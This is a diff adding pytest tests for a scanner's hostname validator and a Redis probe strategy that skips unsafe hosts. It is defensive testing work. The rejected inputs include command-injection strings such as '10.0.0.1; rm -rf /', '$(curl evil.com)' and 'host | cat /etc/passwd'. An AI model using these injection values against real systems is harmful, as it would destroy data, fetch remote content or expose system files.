@@ -7,6 +7,7 @@ from opentools.scanner.mutation.models import DiscoveredService, IntelBundle, Ki
 from opentools.scanner.mutation.strategy import (
     MutationStrategy,
     RedisProbeStrategy,
+    _validate_host,
     get_builtin_strategies,
 )
 from opentools.scanner.models import ExecutionTier, ScanTask, TaskType
@@ -330,3 +331,88 @@ class TestGetBuiltinStrategies:
         assert len(strategies_a) == len(strategies_b)
         for a, b in zip(strategies_a, strategies_b):
             assert a is not b
+
+
+# ---------------------------------------------------------------------------
+# TestValidateHost — command injection guard
+# ---------------------------------------------------------------------------
+
+
+class TestValidateHost:
+    """Ensure _validate_host rejects shell metacharacters."""
+
+    @pytest.mark.parametrize(
+        "host",
+        [
+            "10.0.0.1",
+            "example.com",
+            "my-host.internal",
+            "192.168.1.1",
+            "[::1]",
+            "fe80::1",
+        ],
+    )
+    def test_safe_hosts_accepted(self, host: str):
+        assert _validate_host(host) is True
+
+    @pytest.mark.parametrize(
+        "host",
+        [
+            "10.0.0.1; rm -rf /",
+            "$(curl evil.com)",
+            "`whoami`",
+            "host | cat /etc/passwd",
+            "10.0.0.1 && echo pwned",
+            "host\nnewline",
+            "",
+        ],
+    )
+    def test_unsafe_hosts_rejected(self, host: str):
+        assert _validate_host(host) is False
+
+    def test_overlong_host_rejected(self):
+        long_host = "a" * 254
+        assert _validate_host(long_host) is False
+
+    def test_max_length_host_accepted(self):
+        max_host = "a" * 253
+        assert _validate_host(max_host) is True
+
+
+class TestRedisProbeCommandInjection:
+    """RedisProbeStrategy must skip services with unsafe hostnames."""
+
+    def setup_method(self):
+        self.strategy = RedisProbeStrategy()
+        self.scan_id = "scan-inject"
+
+    def test_malicious_host_skipped(self):
+        """A Redis service with shell metacharacters in the host is silently skipped."""
+        state = KillChainState()
+        state.ingest(
+            IntelBundle(
+                services=[
+                    DiscoveredService(
+                        host="10.0.0.1; rm -rf /",
+                        port=6379,
+                        protocol="tcp",
+                        service="redis",
+                    ),
+                ]
+            )
+        )
+        completed = _make_task(tool="nmap")
+
+        tasks = self.strategy.evaluate(state, self.scan_id, completed)
+
+        assert tasks == []
+
+    def test_safe_host_still_spawns(self):
+        """Normal hosts continue to produce probe tasks after the guard is added."""
+        state = _make_state_with_redis(host="10.0.0.1", port=6379)
+        completed = _make_task(tool="nmap")
+
+        tasks = self.strategy.evaluate(state, self.scan_id, completed)
+
+        assert len(tasks) == 1
+        assert "10.0.0.1" in tasks[0].command
